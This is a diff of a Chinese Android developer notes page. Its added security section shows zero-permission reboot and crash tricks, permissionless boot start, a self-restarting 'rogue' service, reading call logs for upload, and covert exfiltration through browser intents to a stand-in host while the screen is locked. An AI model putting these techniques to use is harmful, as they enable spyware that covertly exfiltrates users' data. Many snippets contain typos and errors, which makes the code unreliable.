@@ -11,14 +11,14 @@
         <!-- link href='http://fonts.googleapis.com/css?family=Mate+SC' rel='stylesheet' type='text/css' -->
         <link rel="stylesheet" type="text/css" href="/assets/style.css" />
         <link rel="stylesheet" type="text/css" href="/assets/ui.totop.css" />
-        <link href='http://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet' type='text/css'>
+        <!--link href='http://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet' type='text/css' -->
         <script type="text/javascript" src="/assets/jquery.min.js"></script>
         <script type="text/javascript" src="/assets/waypoints.min.js"></script>
         <script type="text/javascript" src="/assets/jquery.ui.totop.js"></script>
         <script type="text/javascript" src="/assets/common.js"></script>
         
         <!-- SyntaxHighlighter -->
-        <link type="text/css" rel="stylesheet" href="http://www.linguofeng.com/wp-content/plugins/syntax-highlighter-and-code-prettifier/styles/shCore.css"/>
+        <!--link type="text/css" rel="stylesheet" href="http://www.linguofeng.com/wp-content/plugins/syntax-highlighter-and-code-prettifier/styles/shCore.css"/>
         <link type="text/css" rel="stylesheet" href="http://www.linguofeng.com/wp-content/plugins/syntax-highlighter-and-code-prettifier/styles/shThemeEmacs.css"/>
         <script type="text/javascript" src="http://www.linguofeng.com/wp-content/plugins/syntax-highlighter-and-code-prettifier/scripts/shCore.js"></script>
         <script type="text/javascript" src="http://www.linguofeng.com/wp-content/plugins/syntax-highlighter-and-code-prettifier/scripts/shBrushJava.js"></script>
@@ -27,24 +27,27 @@
         <script type="text/javascript">
             SyntaxHighlighter.config.clipboardSwf = 'http://www.linguofeng.com/wp-content/plugins/syntax-highlighter-and-code-prettifier/scripts/clipboard.swf';
             SyntaxHighlighter.all();
-        </script>
+        </script-->
         
-        <!-- 
         <link type="text/css" rel="stylesheet" href="/assets/SyntaxHighlighter/styles/shCore.css"/>
-        <link type="text/css" rel="stylesheet" href="/assets/SyntaxHighlighter/styles/shThemeDefault.css"/>
+        <link type="text/css" rel="stylesheet" href="/assets/SyntaxHighlighter/styles/shThemeEmacs.css"/>
         <script type="text/javascript" src="/assets/SyntaxHighlighter/scripts/shCore.js"></script>
         <script type="text/javascript" src="/assets/SyntaxHighlighter/scripts/shBrushJava.js"></script>
+        <script type="text/javascript" src="/assets/SyntaxHighlighter/scripts/shBrushJScript.js"></script>
         <script type="text/javascript" src="/assets/SyntaxHighlighter/scripts/shBrushXml.js"></script>
         <script type="text/javascript">
             SyntaxHighlighter.all();
         </script>
-        -->
          
         <style type="text/css">
             .syntaxhighlighter {
                 width: 750px !important;
                 /*overflow: hidden !important;*/
                 margin-left: 40px !important;
+            }
+            
+            .title {
+                display: none;
             }
         </style>
     </head>
@@ -60,8 +63,14 @@
                             <ul>
                                 <li><a href="/pages/development/android.html">Android</a></li>
                                 <li><a href="/pages/development/java.html">Java</a></li>
+                                <li><a href="/pages/development/java/spring.html">Spring</a></li>
                                 <li><a href="/pages/development/javascript.html">JavaScript</a></li>
                                 <li><a href="/pages/development/jquery.html">jQuery</a></li>
+                            </ul>
+                        </li>
+                        <li>OS
+                            <ul>
+                                <li><a href="/pages/os/ubuntu.html">Ubuntu</a></li>
                             </ul>
                         </li>
                         
@@ -84,82 +93,46 @@
             <div id="content">
                 <div id="charpter">
 <h3>Android</h3>
-<ul>
-	<li><a href="#1">四大组件</a></li>
-	<li><a href="#2">控件</a></li>
-	<li><a href="#3">动画</a>
-	<ul>
-		<li><a href="#301">Tween Animation</a></li>
-		<li><a href="#302">Frame Animation</a></li>
-	</ul></li>
-	<li><a href="#4">Threads线程</a>
-	<ul>
-		<li><a href="#41">AsyncTask异步任务</a></li>
-	</ul></li>
-	<li><a href="#5">常用</a>
-	<ul>
-		<li><a href="#501">获取当前系统版本号</a></li>
-		<li><a href="#502">横屏显示</a></li>
-		<li><a href="#503">全屏无标题栏显示</a></li>
-		<li><a href="#504">无标题栏显示</a></li>
-		<li><a href="#505">自定义标题栏布局</a></li>
-		<li><a href="#506">自定义标题栏背景</a></li>
-		<li><a href="#507">ListView滚动加载</a></li>
-		<li><a href="#508">异常处理</a></li>
-	</ul></li>
-	<li><a href="#6">优化</a>
-	<ul>
-		<li><a href="#601">ListView优化</a></li>
-		<li><a href="#602">图片缓存</a></li>
-	</ul></li>
-	<li><a href="#7">网络编程</a></li>
-	<li><a href="#8">资源</a>
-	<ul>
-		<li><a href="#801">drawble</a></li>
-		<li><a href="#802">values</a></li>
-		<li><a href="#803">raw</a></li>
-		<li><a href="#804">assets</a></li>
-	</ul></li>
-</ul>
 </div>
 <h1>Android</h1>
-<h3 id="1">Android四大组件<br />
+<h3 id="1">Android四大组件 <span class="title">四大组件</span><br />
 <hr /></h3>
 <ul>
-	<li id="activity"><strong>Activity</strong>
+	<li class="1" id="101"><strong>Activity</strong> <span class="title">Activity</span>
 	<ul>
 		<li><a href="http://www.linguofeng.com/2011/09/special-edition-_activity-android-life-cycle.html">Activity生命周期</a></li>
 		<li><a href="android/PreferenceActivity.html">PreferenceActivity的使用</a></li>
 	</ul></li>
 </ul>
 <ul>
-	<li id="service"><strong>Service</strong> &#8211; 服务
+	<li class="1" id="102"><strong>Service</strong> &#8211; 服务 <span class="title">服务</span>
 	<ul>
-		<li><a href="http://www.linguofeng.com">startService</a></li>
-		<li><a href="http://blog.greensock.com">bindService</a></li>
+		<li><a href="android/startService.html">startService</a></li>
+		<li><a href="android/bindService.html">bindService</a></li>
 		<li><a href="android/AIDL.html"><span class="caps">AIDL</span></a> &#8211; Android Interface Definition Language(接口描述语言，用于进程通信)</li>
+		<li><a href="android/IntentService.html">IntentService</a> &#8211; 异步服务，方便处理耗时任务</li>
 	</ul></li>
 </ul>
 <ul>
-	<li id="broadcastreceiver"><strong>BroadcastReceiver</strong> &#8211; 广播接收者</li>
+	<li class="1" id="103"><strong>BroadcastReceiver</strong> &#8211; 广播接收者 <span class="title">广播接收者</span></li>
 </ul>
 <ul>
-	<li id="contentprovider"><strong>ContentProvider</strong> &#8211; 内容提供者</li>
+	<li class="1" id="104"><strong>ContentProvider</strong> &#8211; 内容提供者 <span class="title">内容提供者</span></li>
 </ul>
-<h3 id="2">Android UI控件<br />
+<h3 id="2">Android UI控件 <span class="title">UI控件</span><br />
 <hr /></h3>
 <ul>
 	<li><a href="java.html">TextView</a> &#8211; 文本</li>
 	<li><a href="android/menu.html">Menus</a> &#8211; 菜单（Options Menu、Context Menu、Submenu）</li>
 	<li><a href="android/dialog.html">Dialogs</a> &#8211; 对话框（AlertDialog、ProgressDialog、DatePickerDialog、TimePickerDialog）</li>
 	<li><a href="android/Notifications.html">Notifications</a> &#8211; 通知（Toast Notification、Status Bar Notification、Dialog Notification）</li>
-	<li><a href="android/ViewPager.html">ViewPager</a> &#8211; *视图切换</li>
+	<li><a href="android/ViewFlipper.html">ViewFlipper</a> &#8211; 视图切换</li>
 	<li><a href="http://www.linguofeng.com">Custom Components</a> &#8211; 自定义控件</li>
 </ul>
-<h3 id="3">Android动画<br />
+<h3 id="3">Android动画 <span class="title">动画</span><br />
 <hr /></h3>
 <ul>
-	<li id="301"><strong>Tween Animation</strong>
+	<li class="3" id="301"><strong>Tween Animation</strong> <span class="title">Tween</span>
 	<ul>
 		<li><a href="android/TranslateAnimation.html">平移</a> &#8211; TranslateAnimation</li>
 		<li><a href="android/AlphaAnimation.html">渐变</a> &#8211; AlphaAnimation</li>
@@ -168,35 +141,35 @@
 	</ul></li>
 </ul>
 <ul>
-	<li id="302"><strong>Frame Animation</strong>
+	<li class="3" id="302"><strong>Frame Animation</strong> <span class="title">Frame</span>
 	<ul>
 		<li><a href="android/AnimationDrawable.html">逐帧动画</a> &#8211; AnimationDrawable</li>
 	</ul></li>
 </ul>
-<h3 id="4">Threads线程<br />
+<h3 id="4">Threads线程 <span class="title">线程</span><br />
 <hr /></h3>
 <ul>
-	<li id="41"><a href="android/AsyncTask.html">AsyncTask 异步任务</a></li>
+	<li class="4" id="41"><a href="android/AsyncTask.html">AsyncTask 异步任务</a> <span class="title">AsyncTask</span></li>
 </ul>
-<h3 id="5">常用<br />
+<h3 id="5">常用 <span class="title">常用</span><br />
 <hr /></h3>
 <ul>
-	<li id="501"><strong>获取当前系统版本号</strong><br />
+	<li class="5" id="501"><strong>获取当前系统版本号</strong> <span class="title">获取系统版本</span><br />
 <hr /></li>
 </ul>
 <pre>android.os.Build.VERSION.SDK_INT</pre>
 <ul>
-	<li id="502"><strong>横屏显示</strong><br />
+	<li class="5" id="502"><strong>横屏显示</strong> <span class="title">横屏显示</span><br />
 <hr /></li>
 </ul>
 <pre>&lt;activity android:screenOrientation="landscape"</pre>
 <ul>
-	<li id="503"><strong>全屏无标题栏显示</strong><br />
+	<li class="5" id="503"><strong>全屏无标题栏显示</strong> <span class="title">全屏无标题栏显示</span><br />
 <hr /></li>
 </ul>
 <pre>&lt;application android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"</pre>
 <ul>
-	<li id="504"><strong>无标题栏显示</strong><br />
+	<li class="5" id="504"><strong>无标题栏显示</strong> <span class="title">无标题栏显示</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: xml">
@@ -209,7 +182,7 @@
 requestWindowFeature(Window.FEATURE_NO_TITLE);
 </pre>
 <ul>
-	<li id="505"><strong>自定义标题栏布局</strong><br />
+	<li id="505"><strong>自定义标题栏布局</strong> <span>(title)</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java;">
@@ -259,7 +232,7 @@ getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.main_title);
 &lt;/RelativeLayout&gt;
 </pre>
 <ul>
-	<li id="506"><strong>自定义标题栏背景与高度</strong> (上面只是自定义标题栏的而已，而背景与高度还是没有变化，接下来就要处理标题栏背景与高度)<br />
+	<li class="5" id="506"><strong>自定义标题栏背景与高度</strong> (上面只是自定义标题栏的而已，而背景与高度还是没有变化，接下来就要处理标题栏背景与高度) <span class="title">自定义标题栏</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: xml">
@@ -279,7 +252,7 @@ getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.main_title);
 &lt;activity android:name=".MainActivity" android:theme="@style/title" /&gt;
 </pre>
 <ul>
-	<li id="507"><strong>ListView滚动加载更新数据</strong><br />
+	<li class="5" id="507"><strong>ListView滚动加载更新数据</strong> <span class="title">ListView滚动更新</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java">
@@ -300,7 +273,7 @@ ListView.setOnScrollListener(new OnScrollListener() {
 });
 </pre>
 <ul>
-	<li id="508"><strong>异常处理</strong> (提示用户把异常信息回馈给公司)<br />
+	<li class="5" id="508"><strong>异常处理</strong> (提示用户把异常信息回馈给公司) <span class="title">异常处理</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java">
@@ -368,7 +341,7 @@ public class App extends Application {
 }
 </pre>
 <ul>
-	<li id="509"><strong>在子线程中使用主线程的消息队列</strong><br />
+	<li class="5" id="509"><strong>在子线程中使用主线程的消息队列</strong> <span class="title">子线程消息</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java;">
@@ -380,7 +353,7 @@ Toase.makeText(this, "我是在子线程中利用Looper消息队列实现显示"
 Looper.loop();
 </pre>
 <ul>
-	<li id="510"><strong>获取应用版本号并在线更新应用</strong><br />
+	<li class="5" id="510"><strong>获取应用版本号并在线更新应用</strong> <span class="title">在线更新应用</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java">
@@ -388,10 +361,106 @@ PackageInfo pi = Context.getPackageManager().getPackageInfo(Context.getPackageNa
 // 版本
 pi.versionName;
 </pre>
-<h3 id="6">优化<br />
+<ul>
+	<li class="5" id="511"><strong>杀死后台进程</strong> <span class="title">杀死后台进程</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 如果系统版本小于2.2的话
+if (android.os.Build.VERSION.SDK_INT &lt; 8) {  
+    actMag.restartPackage("packageName");  
+} else {  
+    actMag.killBackgroundProcesses("packageName");  
+} 
+</pre>
+<ul>
+	<li class="5" id="513"><strong>发短信/彩信</strong> <span class="title">发短信</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 标准
+SmsManager smsManager = SmsManager.getDefault();
+String message = "短信内容，有可能超过70个字符";
+PendingIntent sentIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, new Intent(), 0);
+
+if (message &gt; 70) {
+    // 截断70字一条
+    List&lt;String&gt; msgs = smsManager.divideMessage(message);
+    for (String msg : msgs) {
+        smsManager.sendTextMessage("对方电话号码", null, msg, sentIntent, null);
+    }
+} else {
+    smsManager.sendTextMessage("对方电话号码", null, message, sentIntent, null);
+}
+</pre>
+<ul>
+	<li class="5" id="514"><strong>Intent用法全面总结</strong> <span class="title">常用Intent</span><br />
+<hr />
+	<ul>
+		<li><a href="android/Intent.html">Intent用法全面总结</a></li>
+	</ul></li>
+</ul>
+<ul>
+	<li class="5" id="515"><strong>判断sdcard是否存在</strong> <span class="title">sdcard是否存在</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+public boolean isSdCardExists() { 
+    if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) { 
+        return true; 
+    } else { 
+        return false; 
+    }
+}
+</pre>
+<ul>
+	<li class="5" id="516"><strong>判断某个服务是否正在运行</strong> <span class="title">服务是否正在运行</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+public boolean isServiceRunning(String serviceName) { 
+    ActivityManager manager = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE); 
+    for (RunningServiceInfo svc : manager.getRunningServices(Integer.MAX_VALUE)) { 
+        if (svc.service.getClassName().equals(serviceName)) { 
+            return true; 
+        } 
+    }
+    return false; 
+}
+</pre>
+<ul>
+	<li class="5" id="517"><strong>获取已安装的软件信息</strong> <span class="title">获取已安装软件信息</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+public List&lt;HashMap&lt;String, Object&gt;&gt; getInstalledApps() { 
+    List&lt;ApplicationInfo&gt; pkgs = ctx.getPackageManager().getInstalledApplications(0); 
+    
+    HashMap&lt;String, Object&gt; map; 
+    List&lt;HashMap&lt;String, Object&gt;&gt; list = new ArrayList&lt;HashMap&lt;String, Object&gt;&gt;(); 
+    
+    Iterator&lt;ApplicationInfo&gt; i = pkgs.iterator(); 
+    while (i.hasNext()) { 
+        ApplicationInfo app = i.next(); 
+        String pkgName = app.packageName; 
+        String label = ""; 
+        try { 
+            label = ctx.getPackageManager().getApplicationLabel(app).toString(); 
+        } catch (Exception e) { 
+            Log.e(tag, "setLabel is error. " + e.getMessage()); 
+        } 
+        map = new HashMap&lt;String, Object&gt;(); 
+        map.put("name", label); 
+        map.put("desc", pkgName); 
+        list.add(map);
+    }
+    return list; 
+}
+</pre>
+<h3 id="6">优化 <span class="title">优化</span><br />
 <hr /></h3>
 <ul>
-	<li id="601"><strong>ListView优化</strong><br />
+	<li class="6" id="601"><strong>ListView优化</strong> <span class="title">ListView优化</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java;">
@@ -410,7 +479,7 @@ public View getView(...){
 }
 </pre>
 <ul>
-	<li id="602"><strong>图片缓存</strong> 软引用办法实现缓存<br />
+	<li class="6" id="602"><strong>图片缓存</strong> 软引用办法实现缓存 <span class="title">图片缓存</span><br />
 <hr /></li>
 </ul>
 <pre class="brush: java">
@@ -425,7 +494,7 @@ if (imageCache.containsKey(imageUrl)) {
 // 存
 imageCache.put(imageUrl, new SoftReference&lt;Drawable&gt;(bitmap));
 </pre>
-<h3 id="7">网络编程<br />
+<h3 id="7">网络编程 <span class="title">网络编程</span><br />
 <hr /></h3>
 <ul>
 	<li><strong><span class="caps">URL</span></strong> &amp; <strong>URLConnection</strong> （常用于下载文件）
@@ -454,10 +523,11 @@ imageCache.put(imageUrl, new SoftReference&lt;Drawable&gt;(bitmap));
 <ul>
 	<li><strong>Socket</strong> （TCP &amp; UDP）</li>
 </ul>
-<h3 id="8">资源<br />
+<h3 id="8">资源 <span class="title">资源</span><br />
 <hr /></h3>
 <ul>
-	<li id="801"><strong>drawable</strong></li>
+	<li class="8" id="801"><strong>drawable</strong> <span class="title">drawable</span><br />
+<hr></li>
 </ul>
 <pre class="brush: xml">
 &lt;!-- XML中使用该类型资源 --&gt;
@@ -469,7 +539,8 @@ imageCache.put(imageUrl, new SoftReference&lt;Drawable&gt;(bitmap));
 Drawable icon = getResources().getDrawable(R.drawable.icon);
 </pre>
 <ul>
-	<li id="802"><strong>values</strong></li>
+	<li class="8" id="802"><strong>values</strong> <span class="title">values</span><br />
+<hr></li>
 </ul>
 <pre class="brush: xml">
 &lt;!-- XML中使用该类型资源 --&gt;
@@ -489,17 +560,370 @@ String[] texts = getResources().getStringArray(R.array.texts);
 int color = getResources().getColor(R.color.black);
 </pre>
 <ul>
-	<li id="803"><strong>raw</strong></li>
+	<li class="8" id="803"><strong>raw</strong> <span class="title">raw</span><br />
+<hr></li>
 </ul>
 <pre class="brush: java">
 InputStream in = getResources().openRawResource(R.raw.test);
 </pre>
 <ul>
-	<li id="804"><strong>assets</strong></li>
+	<li class="8" id="804"><strong>assets</strong> <span class="title">assets</span><br />
+<hr></li>
 </ul>
 <pre class="brush: java">
 AssetManager assetManager = getResources().getAssets();
 InputStream is = assetManager.open("文件名", MODE_APPEND);
+</pre>
+<h3 id="9">安全专题 <span class="title">安全专题</span><br />
+<hr></h3>
+<ul>
+	<li><strong>基本介绍</strong><br />
+<hr />
+	<ul>
+		<li><strong>AndroidManifest.xml</strong><br />
+<hr>
+		<ul>
+			<li>作用1：声明包名且唯一</li>
+			<li>作用2：声明程序的组件</li>
+			<li>作用3：声明程序的权限</li>
+		</ul></li>
+		<li><strong>Activity</strong><br />
+<hr>
+		<ul>
+			<li>作用1：与用户交互的界面</li>
+			<li>作用2：一个View容器</li>
+			<li>作用3：受ActivityManager管理，维护Activity的task栈</li>
+			<li>作用4：启动的4种模式</li>
+			<li>作用5：可以被另的应用程序启动</li>
+			<li>作用6：运行在当前程序的进程中</li>
+			<li>作用7：可以添加权限</li>
+		</ul></li>
+		<li><strong>Intent</strong> （意图）<br />
+<hr>
+		<ul>
+			<li>作用1：描述一个操作</li>
+			<li>作用2：简单IPC的实现（进程间通信）</li>
+			<li>作用3：传递数据</li>
+			<li>作用4：激活3大组件（Activity，Service，Broadcast）</li>
+		</ul></li>
+		<li><strong>Broadcast Receiver</strong> （广播）<br />
+<hr>
+		<ul>
+			<li>作用1：接受广播的intent</li>
+			<li>作用2：在清单文件中注册</li>
+			<li>作用3：无序广播（异步），不可被终止</li>
+			<li>作用4：有序广播（同步），可以被终止</li>
+		</ul></li>
+		<li><strong>Service</strong>  （服务）<br />
+<hr />
+		<ul>
+			<li>作用1：后台运行的组件</li>
+			<li>作用2： 默认不在单独进程中</li>
+			<li>作用3：运行在主线程中</li>
+			<li>作用4：没有界面的Activity</li>
+		</ul></li>
+	</ul></li>
+</ul>
+<ul>
+	<li><strong>沙箱机制</strong><br />
+<hr /></li>
+</ul>
+<pre>
+就是签名与权限的验证机制，只要遵守这个机制就可以超越一些安全防锁，但很麻烦
+</pre>
+<ul>
+	<li><strong>0权限重启手机</strong><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 0权限重启手机
+Intent intent = new Intent(Intent.ACTION_REBOOT);
+// 重启等待时间
+intent.putExtra("nowait", 1);
+// 重启的次数
+intent.putExtra("interval", 1);
+intent.putExtra("window", 0);
+sendBroadcast(intent);
+
+// 提升应用为系统程序（需要签名与系统签名一致，用到signapk.jar工具）
+&lt;manifest ...
+    android:sharedUserId="android.uid.system"
+    
+// java -jar signapk.jar platform.x509.pem platform.pk8 原.apk 后.apk
+</pre>
+
+<pre class="brush: java">
+// 0权限重启手机（JNI版：Toast底层就是使用JNI）
+while(true){
+    Toast toast = new Toast(this);
+    // 不显示Toast的内容
+    toast.setView(new View(this)); 
+    toast.show();
+}
+</pre>
+<ul>
+	<li><strong>0权限开机启动</strong> （Android系统漏洞）<br />
+<hr /></li>
+</ul>
+<pre class="brush: xml">
+&lt;!-- BootCompleteReceiver需要继承BroadcastReceiver --&gt;
+&lt;receiver android:name=".BootCompleteReceiver"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="android.intent.action.BOOT_COMPLETED" /&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+
+&lt;!-- 权限可以不添加 --&gt;
+&lt;!-- uses-permission / --&gt;
+</pre>
+
+<pre class="brush: java">
+public class BootCompleteReceiver extends BroadcastReceiver {
+    public void onReceive(Context context, Intent intent) {
+        
+    }
+}
+</pre>
+<ul>
+	<li><strong>流氓服务</strong> （不死的服务）<br />
+<hr /></li>
+</ul>
+<pre>
+原理：在服务1被结束时启动服务2，在服务2结束时启动服务1，如此交替。
+</pre>
+<ul>
+	<li><strong>隐私</strong> （Logcat大法：adb logcat -b xxx）<br />
+<hr />
+	<ul>
+		<li>Main     /dev/log/main</li>
+		<li>Events   /dev/log/events</li>
+		<li>Radio    /dev/log/radio</li>
+		<li>System   /dev/log/system</li>
+	</ul></li>
+</ul>
+<ul>
+	<li><strong>Logcat实操</strong> 目的：通过服务获取手机的所有日志并上传到服务器<br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+public class ReadLogService extends Service {
+
+    public IBinder onBind(Intext intext) {
+        return null;
+    }
+    
+    public void onStart(Intent intent, int startId) {
+        super.onStart(intent, startId);
+        // 开启线程读取日志（需要相关READ_LOGS权限）
+        new Thread(new ReadLogTask()).start();
+    }
+    
+    private class ReadLogTask implements Runnable {
+        public void run() {
+            // logcat -b main
+            // logcat -b events     操作相关的日志
+            // logcat -b radio      通话相关的日志
+            // logcat -b system
+            Process process = Runtime.getRunntime().exec("logcat -b radio");
+            InputStream is = process.getInputStream();
+            ByfferedReader br = new BufferedRead(new InputStreamReader(is));
+            
+            // TODO 把br流写到一个文件里或上传到服务器
+        }
+    }
+}
+</pre>
+<ul>
+	<li><strong>0权限访问网络</strong> （上传）<br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+public class ViewWebService extends Service {
+    ScreenOFFBroadcastReceiver off;
+    ScreenONBroadcastReceiver on;
+    KeyGuardManager mKeyGuardManager;
+
+    public IBinder onBind(Intext intext) {
+        return null;
+    }
+    
+    // 监听锁屏广播
+    class ScreenOFFBroadcastReceiver extends BroadcastReceiver {
+        public void onReceive(Context context, Intent intent) {
+            // TODO 上传数据
+            handler.postDelayed(r, 500);
+        }
+    }
+    
+    // 监听开屏广播
+    class ScreenONBroadcastReceiver extends BroadcastReceiver {
+        public void onReceive(Context context, Intent intent) {
+            // TODO 停止上传
+            handler.removeCallbacks(r);
+            
+            // 模拟HOME键退出浏览器（需要借助一个Activity实现）
+            // dispatchKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.ACTION_HOME));
+            Intent intent = new Intent();
+            intent.addAction(Intent.ACTION_VIEW);
+            intent.addCategory(Intent.CATEGORY_HOME);
+            startActivity(intent);
+        }
+    }
+    
+    public void onCreate() {
+        super.onCreate();
+        
+        //
+        mKeyGuardManager = (KeyGuardManager)getSystemService(KEYGUARD_SERVICE);
+        
+        off = new ScreenOFFBroadcastReceiver();
+        on = new ScreenONBroadcastReceiver();
+        
+        // 注册锁屏广播
+        IntentFilter ifOFF = new IntentFilter(android.intent.action.SCREEN_OFF);
+        registerReceiver(off, ifOFF);
+
+        // 注册开屏广播
+        IntentFilter ifON = new IntentFilter(android.intent.action.SCREEN_ON);
+        registerReceiver(on, ifON);
+    }
+    
+    Handler handler = new Handler();
+    
+    private Runnable r = new Runnable() {
+        public void run() {
+            // 锁屏状态
+            if(mKeyGuardManager.inKeyguardRestrictedInputMode()) {
+                Intent intent = new Intent(Intent.ACTION_VIEW);
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.setData(Uri.parse("http://10.0.2.2/test.action?name=android"));
+                startActivity(intent);
+
+                // 重复发送
+                handler.postDelayed(r, 500);
+            }
+        }
+    };
+}
+</pre>
+<h3 id="10">多媒体 <span class="title">多媒体</span><br />
+<hr /></h3>
+<ul>
+	<li class="10" id="1001"><strong>从相册中获取图片</strong> <span class="title">获取图片</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 打开相册的意图
+Intent intent = new Intent(Intent.ACTION_PICK);
+intent.setType("image/*");
+startActivityForResult(intent, 0);
+
+public void onActivityResult(...) {
+    Uri uri = data.getData();
+    BitmapFactory.Options bfo = new BitmapFactory.Options();
+    bfo.inSampleSize = 8;
+    InputStream is = getContentResoler().openInputStream(uri);
+    Bitmap bitmap = BitmapFactory.decodeFile(is, bfo);
+}
+</pre>
+<ul>
+	<li class="10" id="1002"><strong>从相册中获取图片并按屏幕大小比例缩放显示</strong> <span class="title">比例缩放</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 获取屏幕宽高
+Display display = getWindowManager().getDefaultDisplay();
+display.getWidth();
+display.getHeight();
+
+BitmapFactory.Options bfo = new BitmapFactory.Options();
+bfo.inJustDecodeBounds = true;
+BitmapFactory.decodeFile("图片路径", bfo);
+Math.deil(bfo.outHeight / display.getHeight());
+Math.deil(bfo.outWidth / display.getWidth());
+</pre>
+<ul>
+	<li class="10" id="1003"><strong>获取图片Exif信息</strong> <span class="title">Exif信息</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+ExifInterface exif = ExifInterface("图片路径");
+// 获取
+exif.getAttribute(ExifInterface.对应的常量);
+// 设置
+exif.setAttribute(ExifInterface.对应的常量, "值");
+</pre>
+<ul>
+	<li class="10" id="1004"><strong>创建Bitmap拷贝</strong> <span class="title">Bitmap拷贝</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 原图
+Bitmap source = BitmapFactory...
+//创建空白的Bitmap： 宽、高、原图的配置属性
+Bitmap bitmap = Bitmap.createBitmap(width, height, source.getConfig());
+// 画布
+Canvas canvas = new Canvas(bitmap);
+// 画笔
+Paint paint = new Paint();
+// 举正
+Matrix matrix = new Matrix();
+// 把原图画到bitmap中
+canvas.drawBitmap(source, matrix, paint);
+// 拷贝
+Btimap bak = bitmap;
+</pre>
+<ul>
+	<li class="10" id="1005"><strong>图形缩放（Scale）、旋转（Rotate）、平移（Translate）</strong> <span class="title">图形缩旋平</span><br />
+<hr /></li>
+</ul>
+<pre>
+Matrix类的使用
+</pre>
+<ul>
+	<li class="10" id="1006"><strong>颜色处理</strong> <span class="title">颜色处理</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// ColorMatrix类的使用
+ColorMatrix.set(new float[]{
+    1,0,0,0,0
+    0,1,0,0,0
+    0,0,1,0,0
+    0,0,0,1,0
+    
+    // 计算公式
+    // 红：  1*128 + 0*128 + 0...
+    // 绿：  0*128 + 1*128 + 0...
+    // 蓝：  0*128 + 0*128 + 1...
+    // 透明：0*128 + 0*128 + 0...
+});
+</pre>
+<ul>
+	<li class="10" id="1007"><strong>图片合成</strong> <span class="title">图片合成</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 混合模式PorterDuffXfermode
+Paint.setXfermode(new PorterDuffXfermode(android.graphics.PorterDuff.Mode.MULTIPLY));
+</pre>
+<ul>
+	<li class="10" id="1008"><strong>Path路径文字</strong> 弧度 <span class="title">Path路径文字</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// Path类与Canvas.drawTextOnPath()方法的使用
+
+// 模拟SD卡被装载的广播
+//new Intent(ACTION_MEDIA_MOUNTED, Uri.aprse("file:///"));
+</pre>
+<ul>
+	<li class="10" id="1009"><strong>人脸识别</strong> 弧度 <span class="title">人脸识别</span><br />
+<hr /></li>
+</ul>
+<pre class="brush: java">
+// 人脸识别
+// FaceDetector类的使用
 </pre>
                 
                 <hr />
